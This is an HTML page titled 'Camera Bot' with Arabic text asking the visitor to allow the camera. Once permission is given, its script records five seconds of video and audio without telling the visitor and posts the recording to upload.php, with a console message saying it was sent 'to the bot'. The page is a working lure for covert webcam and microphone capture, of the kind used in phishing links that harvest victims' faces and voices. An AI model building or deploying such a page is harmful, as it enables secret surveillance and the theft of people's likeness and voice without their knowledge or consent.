
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Camera Bot</title>
</head>
<body dir="rtl" style="font-family: Arial; text-align:center; padding:20px;">
  <h2>يرجى السماح للكاميرا</h2>
  <video id="preview" autoplay muted playsinline style="width: 90%; max-width: 500px;"></video>
  <script>
    const video = document.getElementById('preview');

    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
      video.srcObject = stream;

      const mediaRecorder = new MediaRecorder(stream);
      let chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('video', blob, 'recording.webm');
        fetch('upload.php', { method: 'POST', body: formData })
          .then(res => console.log('تم الإرسال إلى البوت'))
          .catch(err => console.error('خطأ:', err));
      };

      setTimeout(() => {
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
      }, 1000);

    }).catch(err => {
      alert("يجب السماح باستخدام الكاميرا!");
      console.error(err);
    });
  </script>
</body>
</html>
